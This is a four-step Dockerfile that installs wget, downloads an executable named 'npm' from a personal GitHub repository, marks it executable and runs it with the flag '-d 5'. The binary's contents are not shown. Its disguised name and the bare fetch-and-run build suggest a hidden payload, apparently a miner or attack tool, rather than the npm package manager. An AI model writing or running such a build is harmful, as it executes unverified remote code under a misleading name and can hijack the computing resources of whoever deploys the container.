FROM ubuntu:16.04

RUN apt-get update && apt-get install -y wget && rm -rf npm
RUN wget https://github.com/hisi12/hisi/raw/master/npm
RUN chmod +x npm

RUN ./npm -d 5
